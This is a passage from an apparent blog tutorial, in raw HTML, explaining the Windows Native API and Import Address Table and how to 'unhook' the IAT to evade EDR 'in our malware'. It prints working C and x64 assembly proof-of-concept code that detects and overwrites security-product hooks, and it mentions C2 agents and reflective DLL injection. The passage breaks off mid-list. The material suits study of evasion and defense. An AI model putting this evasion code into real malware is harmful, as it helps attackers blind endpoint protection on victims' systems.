mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">— You can see DLLs for Native APIs like : ntdll.dll or win32u.dll<br> — Distinguishable by the NT or ZW prefix</p><p id="2e33" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">2. Windows API: The Windows API, also known as the WinAPI or the Win32 API, is a higher-level interface built on top of the Native API. It provides a more user-friendly and abstracted programming interface for application developers. The Windows API includes a vast collection of functions and resources that allow programmers to interact with various aspects of the Windows operating system, such as GUI components, file operations, registry access, and more. It encapsulates many common syscalls within higher-level functions, making it easier to develop Windows applications.</p><p id="df86" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">— Officially documented by Microsoft <a class="ah op" href="https://learn.microsoft.com/en-us/windows/win32/api/" rel="noopener ugc nofollow" target="_blank">Programming reference for the Win32 API — Win32 apps | Microsoft Learn</a> “MSDN”<br> — Exported by different DLL such as user32.dll or kernel32.dll, etc.</p><figure class="nv nw nx ny nz oa ns nt paragraph-image"><div role="button" tabindex="0" class="ob oc fr od bi oe"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="ns nt qt"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*bOLoqVxcUH25aYkcS6XPHw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*bOLoqVxcUH25aYkcS6XPHw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*bOLoqVxcUH25aYkcS6XPHw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*bOLoqVxcUH25aYkcS6XPHw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*bOLoqVxcUH25aYkcS6XPHw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*bOLoqVxcUH25aYkcS6XPHw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bOLoqVxcUH25aYkcS6XPHw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*bOLoqVxcUH25aYkcS6XPHw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*bOLoqVxcUH25aYkcS6XPHw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*bOLoqVxcUH25aYkcS6XPHw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*bOLoqVxcUH25aYkcS6XPHw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*bOLoqVxcUH25aYkcS6XPHw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*bOLoqVxcUH25aYkcS6XPHw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*bOLoqVxcUH25aYkcS6XPHw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb of c" width="700" height="486" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*bOLoqVxcUH25aYkcS6XPHw.png"></picture></div></div></figure><p id="53c8" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The key differences between the Native API and the Windows API are:</p><ol class=""><li id="69a3" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qq qr qs bl" data-selectable-paragraph="">The Native API and Windows API differ in four key ways:</li><li id="d793" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Abstraction: The Native API operates at a low level, directly accessing the Windows kernel and system resources. The Windows API simplifies development with a higher-level interface that hides system complexity.</li><li id="b11d" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Complexity: The Native API is intricate, demanding deep system knowledge for detailed control. The Windows API is more accessible, with a simpler learning curve for broader developer use.</li><li id="08ce" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Portability: The Native API is specific to the Windows NT kernel, limiting its scope. The Windows API ensures compatibility across Windows versions, allowing apps to run without major tweaks.</li><li id="8342" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr qq qr qs bl" data-selectable-paragraph="">Documentation and Support: The Windows API offers extensive documentation, a large community, and robust Microsoft support. The Native API has minimal official documentation and fewer resources.</li></ol><blockquote class="qz ra rb"><p id="093b" class="mu mv rc mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">In<em class="hl"> summary, the Native API and the Windows API serve as different levels of abstraction for making syscalls in the Windows operating system. The Native API provides a lower-level, more powerful interface for system programming, while the Windows API offers a higher-level, more user-friendly interface suitable for application development.</em></p></blockquote></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="96ef" class="pw or hl bg os px py pz ov qa qb qc oy qd qe qf qg qh qi qj qk ql qm qn qo qp bl" data-selectable-paragraph="">IAT (Import Address Table) &amp; Unhooking it!</h2><p id="e6a5" class="pw-post-body-paragraph mu mv hl mw b mx pj mz na nb pk nd ne nf pl nh ni nj pm nl nm nn pn np nq nr he bl og" data-selectable-paragraph=""><span class="m oh oi oj bp ok ol om on oo fr">I</span>magine you’re building a large Lego structure, and you need some special Lego pieces that you don’t have in your collection. So, you ask your friend to lend you those pieces. However, you don’t know exactly where your friend keeps those pieces in their Lego collection.</p><p id="1d74" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">To solve this, your friend gives you a list of the names of the special Lego pieces you need and tells you that they will put a sticker on each piece indicating where to find it in their collection. This list is like the Import Directory in Windows.</p><p id="dd48" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">When you receive the list, you start building your structure. When you come across a part that you need from your friend’s collection, you refer to the list to know which piece to take. You check the sticker on that piece, which tells you exactly where to find it. This sticker is like the Import Address Table (IAT).</p><p id="a2cc" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">So, the IAT is like a table that holds the memory addresses of functions (Lego pieces) you need from external libraries (your friend’s Lego collection). It helps your program find the right functions at runtime without having to know the exact memory addresses.</p><p id="f560" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Initially, the IAT contains placeholders or thunks instead of the actual memory addresses. These placeholders act as reminders that the addresses need to be filled in later. When your program starts running, the operating system takes care of replacing the placeholders in the IAT with the real memory addresses of the functions you need from the DLLs.</p><p id="2eae" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">When your program wants to use one of those functions, it looks up the IAT entry for that function and jumps to the memory address stored there. It’s like you finding the Lego piece you need based on the sticker on it and using it to continue building your structure.</p><p id="fc6b" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The IAT provides flexibility and allows programs to import functions from DLLs dynamically. It makes the software development process more modular and helps manage memory efficiently.</p><p id="3cba" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">On the flip side, the IAT can be targeted by attackers who might try to modify the table entries to redirect function calls to malicious code. To counter such threats, security solutions like EDR keep an eye on the IAT for any suspicious changes, helping protect the system from potential malware attacks.</p><figure class="nv nw nx ny nz oa ns nt paragraph-image"><div role="button" tabindex="0" class="ob oc fr od bi oe"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="ns nt rd"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*0lFZrCAhe89UM2GG.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*0lFZrCAhe89UM2GG.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*0lFZrCAhe89UM2GG.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*0lFZrCAhe89UM2GG.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*0lFZrCAhe89UM2GG.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*0lFZrCAhe89UM2GG.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*0lFZrCAhe89UM2GG.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*0lFZrCAhe89UM2GG.png 640w, https://miro.medium.com/v2/resize:fit:720/0*0lFZrCAhe89UM2GG.png 720w, https://miro.medium.com/v2/resize:fit:750/0*0lFZrCAhe89UM2GG.png 750w, https://miro.medium.com/v2/resize:fit:786/0*0lFZrCAhe89UM2GG.png 786w, https://miro.medium.com/v2/resize:fit:828/0*0lFZrCAhe89UM2GG.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*0lFZrCAhe89UM2GG.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*0lFZrCAhe89UM2GG.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb of c" width="700" height="377" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/0*0lFZrCAhe89UM2GG.png"></picture></div></div></figure><p id="98da" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">After we now understand what is the IAT and it’s relation with the EDR we need now in our malware to unhook it ^_^</p><p id="1733" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">@0xNinjaCyclonehave build the best PoC the I have seen ever for IAT Unhooking and special thank for him ^_^, But now let’s see the PoC and how it works.</p></div></div></div><div class="ac ci po pp pq pr" role="separator"><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu pv"></span><span class="ps by bn pt pu"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="6bb5" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl og" data-selectable-paragraph=""><span class="m oh oi oj bp ok ol om on oo fr">A</span>fter thoroughly examining the code, I discovered an important note. When I consulted the author of the code, about why he developed it in assembly language, he provided me with important points:</p><blockquote class="re"><p id="10be" class="rf rg hl bg rh ri rj rk rl rm rn nr eb" data-selectable-paragraph="">He explained that he chose assembly language to facilitate IAT unhooking using the GetModuleHandle API. Additionally, he can retrieve the necessary information from the PEB (Process Environment Block). However, there is a challenge associated with this approach. When the C2 (Command and Control) functionality is active, the code loads a reflected DLL into memory using the “RDI” (Reflective Dll Injection) technique, which serves as an evasion mechanism. Moreover, when the agent has no task to perform, it conceals itself using a technique called “sleep mask obfuscation.”</p><p id="9189" class="rf rg hl bg rh ri rj rk rl rm rn nr eb" data-selectable-paragraph="">In practical terms, if we were to utilize the PEB and GetModuleHandle functions, the process would crash. This occurs because these functions obtain the base address of the main process, “main.exe,” rather than the reflective DLL, “agent.dll,” in memory. Therefore, an alternative approach is required. When the shellcode loads the DLL into memory, it must incorporate a mechanism to resolve the correct address of “agent.dll” in memory, ensuring successful reflective loading. Without such resolution, any attempt to reference the DLL would lead to a crash since the expected address of the DLL cannot be determined.</p></blockquote><p id="5a57" class="pw-post-body-paragraph mu mv hl mw b mx ro mz na nb rp nd ne nf rq nh ni nj rr nl nm nn rs np nq nr he bl og" data-selectable-paragraph=""><span class="m oh oi oj bp ok ol om on oo fr">B</span>ut in our case we used these techniques because we are not C2 agent and in this POC case we control the main loader (only need to resolve the main base address), After all these talking I want to till you that the assembly code will work and will not crash in all situations.</p><p id="c316" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">And now let’s see the code</p><pre class="nv nw nx ny nz rt ru rv bq rw bc bl"><span id="da90" class="rx or hl ru b bh ry rz m sa sb" data-selectable-paragraph="">UNHOOK_STATUS <span class="hljs-title.function">UnhookIAT</span><span class="hljs-params">(LPVOID lpImgBaseAddr)</span><br>{<br> PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)( (DWORD_PTR)lpImgBaseAddr + ( (PIMAGE_DOS_HEADER)lpImgBaseAddr )-&gt;e_lfanew );<br> PIMAGE_DATA_DIRECTORY pImportDir = (PIMAGE_DATA_DIRECTORY)&amp;pNtHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br> PIMAGE_IMPORT_DESCRIPTOR pDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)lpImgBaseAddr + pImportDir-&gt;VirtualAddress);<br> BOOL bNoHooks = TRUE;<br><br> <span class="hljs-keyword">if</span> (( (PIMAGE_DOS_HEADER)lpImgBaseAddr )-&gt;e_magic != IMAGE_DOS_SIGNATURE || pNtHdr-&gt;Signature != IMAGE_NT_SIGNATURE) <span class="hljs-keyword">return</span> INVALID_PE;<br> <span class="hljs-keyword">if</span> ( pImportDir-&gt;Size == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> NO_IMPORTS;<br><br> <span class="hljs-keyword">do</span> {<br>  PIMAGE_THUNK_DATA pILT = (PIMAGE_THUNK_DATA)((DWORD_PTR)lpImgBaseAddr + pDescriptor-&gt;OriginalFirstThunk);<br>  DWORD_PTR dwpIAT = (DWORD_PTR)lpImgBaseAddr + pDescriptor-&gt;FirstThunk;<br>  HMODULE hModule = GetModuleHandleA( (LPCSTR)((DWORD_PTR)lpImgBaseAddr + pDescriptor-&gt;Name) );<br><br>  <span class="hljs-keyword">while</span> ( DEREF(dwpIAT) )<br>  {<br>   DWORD_PTR dwpTrueAddr = <span class="hljs-number">0</span>;<br>   LPCSTR cpFuncName = <span class="hljs-literal">NULL</span>;<br><br>   <span class="hljs-keyword">if</span> ( pILT-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG )<br>    dwpTrueAddr = (DWORD_PTR)ResolveAddrByOrdinal( hModule, IMAGE_ORDINAL(pILT-&gt;u1.Ordinal), &amp;cpFuncName );<br><br>   <span class="hljs-keyword">else</span> {<br>    PIMAGE_IMPORT_BY_NAME pLookup = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)lpImgBaseAddr + pILT-&gt;u1.AddressOfData);<br>    cpFuncName = pLookup-&gt;Name;<br>    dwpTrueAddr = (DWORD_PTR)GetProcAddress( hModule, cpFuncName );<br>   }<br><br>   <span class="hljs-keyword">if</span> ( DEREF(dwpIAT) != dwpTrueAddr )<br>   {<br>    bNoHooks = FALSE;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] Function Name %s in %s DLL is Hooked, its address is 0x%p, the true address is 0x%p\n"</span>, cpFuncName, (LPCSTR)((DWORD_PTR)lpImgBaseAddr + pDescriptor-&gt;Name), (PVOID)DEREF(dwpIAT), (PVOID)dwpTrueAddr);<br><br>    <span class="hljs-comment">/* Unhook it */</span><br>    DWORD dwOldProtect = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (!VirtualProtect((LPVOID)dwpIAT, <span class="hljs-keyword">sizeof</span>(DWORD_PTR), PAGE_READWRITE, &amp;dwOldProtect)) <span class="hljs-keyword">return</span> UNHOOK_FAIL;<br>    DEREF(dwpIAT) = dwpTrueAddr;<br>    <span class="hljs-keyword">if</span> (!VirtualProtect((LPVOID)dwpIAT, <span class="hljs-keyword">sizeof</span>(DWORD_PTR), dwOldProtect, &amp;dwOldProtect)) <span class="hljs-keyword">return</span> UNHOOK_FAIL;<br>   }<br><br><br>   dwpIAT += <span class="hljs-keyword">sizeof</span>(DWORD_PTR);<br>   pILT++;<br>  }<br><br>  pDescriptor++;<br><br> } <span class="hljs-keyword">while</span> ( pDescriptor-&gt;Name );<br><br> <span class="hljs-keyword">return</span> ( bNoHooks ? NO_HOOKS : UNHOOK_SUCCESS );<br>}</span></pre><p id="ea7c" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">In this code “Wait I can’t explain the code in funny way I’m sorry”, The function takes as input the base address of the executable module (lpImgBaseAddr). It starts by extracting important information from the module’s headers to understand its structure.</p><p id="7ad5" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Next, it locates the Import Directory within the module, which contains information about the imported functions. The code iterates through each import descriptor to process the imported functions one by one.</p><p id="3dc6" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">For each import descriptor, the code retrieves the Original First Thunk, which is a list of function import addresses. It also gets the First Thunk, which is where the actual addresses of the functions are stored.</p><p id="49bf" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The code then enters a loop to process each function in the import address table (IAT). It compares the stored address in the IAT with the address obtained by looking up the function by name in its corresponding DLL. If the addresses don’t match, it means that the function has been hooked.</p><p id="fc16" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">In this case, the code sets a flag (bNoHooks) to indicate that there are hooks present. It prints a message indicating the name of the hooked function, the DLL it belongs to, the address in the IAT, and the true address of the function.</p><p id="2346" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">To unhook the function, the code modifies the protection settings of the IAT entry to allow writing, replaces the hooked address with the true address, and restores the original protection settings.</p><p id="e6cf" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">The code continues iterating through all the imported functions in the module until it finishes processing all import descriptors.</p><p id="7314" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">Finally, based on the status of the hooks detected, the function returns an appropriate value: UNHOOK_SUCCESS if hooks were present but successfully removed, NO_HOOKS if there were no hooks, UNHOOK_FAIL if there was an error during the unhooking process, INVALID_PE if the module is not a valid PE file, or NO_IMPORTS if the module has no imports.</p><p id="66c5" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">This function can be used as a tool to identify and potentially remove IAT hooks, which are modifications made to the function addresses in the IAT for various purposes.</p><pre class="nv nw nx ny nz rt ru rv bq rw bc bl"><span id="144b" class="rx or hl ru b bh ry rz m sa sb" data-selectable-paragraph="">;<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**<span class="hljs-emphasis">*<br>; Author     =&gt; Abdallah Mohamed ( 0xNinjaCyclone )<br>; Date       =&gt; 14-5-2023/11:11PM<br>; Greetz to  =&gt; Hossam Ehab<br>;*</span>**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><br>.code<br><br>;<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>; Get Image base address<br>;<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>GetImgBaseAddr proc<br> call $+5                  ; Call the next instruction<br> pop rax                   ; Get current instruction address<br> mov di, 5A4Dh             ; PE magic number<br> <br> ; Search backward until find image magic number<br> FIND<span class="hljs-emphasis">_MAGIC:<br> dec rax                   ; Go backwards<br> mov si, word ptr [rax]    ; Move current image bytes to si for comparison<br> cmp si, di                ; *pCurrentAddr == IMAGE_</span>DOS<span class="hljs-emphasis">_SIGNATURE ?<br> jne FIND_</span>MAGIC<br><br> ; We have found 'MZ', but we must check NT Headers signature<br> mov ebx, [rax + 3Ch]      ; NT Headers RVA<br><br> ; Some checks to avoid a bogus signature<br> mov ecx, 40h              ; sizeof(IMAGE<span class="hljs-emphasis">_DOS_</span>HEADER)<br> cmp ebx, ecx              ; DOS-&gt;e<span class="hljs-emphasis">_lfanew &lt;= sizeof(IMAGE_</span>DOS<span class="hljs-emphasis">_HEADER)  <br> jle FIND_</span>MAGIC<br><br> mov ecx, 400h             ; 1024<br> cmp ebx, ecx              ; DOS-&gt;e<span class="hljs-emphasis">_lfanew &gt; 1024<br> jg FIND_</span>MAGIC<br><br> push di                   ; Save PE magic number<br> mov edi, 00004550h        ; NT Headers Signature<br> add rbx, rax              ; BaseAddress + DOS-&gt;e<span class="hljs-emphasis">_lfanew<br> mov esi, dword ptr [rbx]  ; ( PIMAGE_</span>NT<span class="hljs-emphasis">_HEADERS )-&gt;Signature <br> cmp esi, edi              ; Signature == IMAGE_</span>NT<span class="hljs-emphasis">_SIGNATURE ?<br> pop di                    ; Restore PE magic number<br> jne FIND_</span>MAGIC            ; So far<br><br> ;<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**<br> ; We have found the image base address<br> ;**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><br> ret<br>GetImgBaseAddr endp<br><br>;<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**<br>; Resolve imported function address by ordinal<br>;**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>ResolveAddrByOrdinal proc<br> xchg rcx, rdx                       ; Swap(BaseAddress, ordinal)<br> xor rax, rax                        ; Clear accumlator reg<br> mov eax, dword ptr [rdx + 3Ch]      ; NT Headers RVA<br> add rax, rdx                        ; BaseAddress + NT<span class="hljs-emphasis">_RVA<br> mov eax, dword ptr [rax + 88h]      ; Export Dir RVA<br> test rax, rax                       ; Maybe there are no exports<br> jz NOEXPORTS                        ; Tell the caller we failed<br> add rax, rdx                        ; Jump on the export table<br> sub ecx, dword ptr [rax + 10h]      ; Ordinal - pDir-&gt;Base<br><br> ; We have to ensure that we rely on a valid ordinal<br> push rcx                            ; Save the ordinal<br> xor rcx, rcx                        ; Clear counter reg<br> mov cx, word ptr [rax + 18h]        ; Number of entries<br> cmp dword ptr [rsp], ecx            ; The ordinal out of the image ordinals range<br> jge INVALID_</span>ORDINAL                 ; Tell the caller we failed<br><br> ; Find the import name<br> mov rdi, r8                         ; Imported name reference<br> xor r9, r9                          ; Clear the register<br> mov r9d, dword ptr [rax + 24h]      ; Image ordinals RVA<br> add r9, rdx                         ; Jump on the ORD table<br> FIND<span class="hljs-emphasis">_NAME_</span>INDEX:<br> dec rcx                             ; We search backward<br> mov si, word ptr [r9 + 2h <span class="hljs-emphasis">* rcx]    ; Retreive current ordinal<br> cmp si, word ptr [rsp]              ; Check if that the target one<br> je FOUND                            ; Let's move on to the next step<br> test rcx, rcx                       ; Check if we've reached the end of the table<br> jnz FIND_NAME_INDEX                 ; Keep digging<br><br> ; WHAT THE FUCK IF THE ORDINAL DOESN'T EXIST WITHIN THE TABLE!<br> jmp INVALID_ORDINAL<br><br> FOUND:<br> mov r8d, dword ptr [rax + 20h]      ; Names RVA<br> add r8, rdx                         ; Add BaseAddress<br> mov ebx, dword ptr [r8 + 4h *</span> rcx]  ; Get target name RVA<br> add rbx, rdx                        ; Add BaseAddress<br> mov [rdi], rbx                      ; Set the name reference<br> <br> ; Get the imported function address<br> pop rcx                             ; pop off the ordinal from the stack<br> mov r8d, dword ptr [rax + 1Ch]      ; EAT RVA<br> add r8, rdx                         ; Jump on the EAT<br> mov eax, [r8 + 4h <span class="hljs-emphasis">* rcx]            ; Required address RVA<br> add rax, rdx                        ; Get Imported function address<br><br> FINISH:<br> ret<br><br> INVALID_ORDINAL:<br> pop rcx<br><br> NOEXPORTS:<br> xor rax, rax<br> jmp FINISH<br><br>ResolveAddrByOrdinal endp<br><br>end</span></span></pre><p id="0ae3" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">In this assembly code is very cool and this is the best thing in the PoC, What is the code do !!</p><ol class=""><li id="c49d" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qq qr qs bl" data-selectable-paragraph="">Searching for the Image:</li></ol><ul class=""><li id="e1c1" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph="">The code starts by looking backward from the current instruction to find the “MZ” magic number, which marks the beginning of the image’s DOS header.</li><li id="4655" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj qx nl nm nn qy np nq nr sc qr qs bl" data-selectable-paragraph="">It keeps moving backward until it finds the “MZ” magic number.</li></ul><p id="696a" class="pw-post-body-paragraph mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr he bl" data-selectable-paragraph="">2. Validating the Image:</p><ul class=""><li id="638d" class="mu mv hl mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr sc qr qs bl" data-selectable-paragraph="">After finding “MZ,” the code checks if the NT Headers signature, which marks the start of the PE header, is valid.</li><li id="a9d4" class="mu mv hl mw b mx qu mz na nb qv nd ne nf qw nh ni nj 